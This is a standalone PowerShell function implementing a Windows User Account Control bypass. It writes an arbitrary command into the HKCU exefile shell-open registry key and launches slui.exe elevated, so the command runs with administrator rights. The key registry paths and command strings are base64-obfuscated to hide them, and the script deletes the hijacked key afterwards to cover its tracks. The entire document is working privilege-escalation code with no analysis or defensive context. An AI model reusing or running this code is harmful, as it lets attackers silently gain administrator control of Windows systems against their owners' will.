function SluiHijackBypass(){
	Param (
		[Parameter(Mandatory=$True)]
		[String]$command,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)
	ni $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAGUAeABlAGYAaQBsAGUAXABzAGgAZQBsAGwAXABvAHAAZQBuAFwAYwBvAG0AbQBhAG4AZAA='))) -Force
	sp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAGUAeABlAGYAaQBsAGUAXABzAGgAZQBsAGwAXABvAHAAZQBuAFwAYwBvAG0AbQBhAG4AZAA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGUAZgBhAHUAbAB0ACkA'))) -Value $command -Force
  if ([Environment]::Is64BitProcess)
    {
			saps $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAbAB1AGkALgBlAHgAZQA='))) -Verb runas
		}
		else
		{
			C:\Windows\Sysnative\cmd.exe /c $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAcwBsAHUAaQAuAGUAeABlACAALQBWAGUAcgBiACAAcgB1AG4AYQBzAA==')))
		}
	sleep 3
	rd $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAGUAeABlAGYAaQBsAGUAXABzAGgAZQBsAGwAXAA='))) -Recurse -Force
}
